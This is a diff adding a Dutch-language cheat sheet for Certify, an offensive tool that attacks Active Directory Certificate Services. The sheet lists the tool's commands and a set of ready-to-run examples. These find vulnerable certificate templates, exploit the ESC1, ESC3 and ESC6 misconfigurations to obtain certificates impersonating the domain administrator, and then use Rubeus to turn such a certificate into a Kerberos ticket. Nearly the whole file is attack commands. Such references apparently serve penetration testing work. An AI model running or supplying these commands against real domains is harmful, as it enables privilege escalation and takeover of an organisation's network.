@@ -1,0 +1,39 @@
+# Certify — AD Certificate Services (ADCS) enumeratie & misbruik
+# Zoek kwetsbare certificaattemplates en vraag certificaten aan voor privilege escalation
+#
+# === Syntax ===
+# Certify.exe <commando> [opties]
+#
+# === Commando's ===
+# find       Zoek certificaattemplates (optioneel /vulnerable)
+# cas        Toon alle Certificate Authorities
+# request    Vraag een certificaat aan
+# download   Download een uitgegeven certificaat
+#
+# === Belangrijkste opties ===
+# /domain:DOMAIN       Doeldomein
+# /ca:CA               Certificate Authority (FQDN\CA-naam)
+# /template:TEMPLATE   Certificaattemplate naam
+# /altname:USER        Subject Alternative Name (impersonatie)
+# /install             Installeer certificaat in store
+# /machine             Gebruik machine context
+#
+# === Voorbeelden ===
+# -- Enumeratie --
+Certify.exe find
+Certify.exe find /vulnerable
+Certify.exe find /vulnerable /domain:DOMAIN /currentuser
+Certify.exe cas
+Certify.exe cas /domain:DOMAIN
+# -- ESC1: Template met ENROLLEE_SUPPLIES_SUBJECT --
+Certify.exe find /vulnerable /domain:DOMAIN
+Certify.exe request /ca:DC.DOMAIN\CA-NAME /template:TEMPLATE /altname:administrator
+# -- ESC3: Enrollment agent template --
+Certify.exe request /ca:DC.DOMAIN\CA-NAME /template:AGENT_TEMPLATE
+Certify.exe request /ca:DC.DOMAIN\CA-NAME /template:USER /onbehalfof:DOMAIN\administrator /enrollcert:agent.pfx
+# -- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 op CA --
+Certify.exe request /ca:DC.DOMAIN\CA-NAME /template:User /altname:administrator
+# -- Certificaat downloaden --
+Certify.exe download /ca:DC.DOMAIN\CA-NAME /id:123
+# -- Na Certify: authenticeer met certificaat via Rubeus --
+# Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:PASS /nowrap
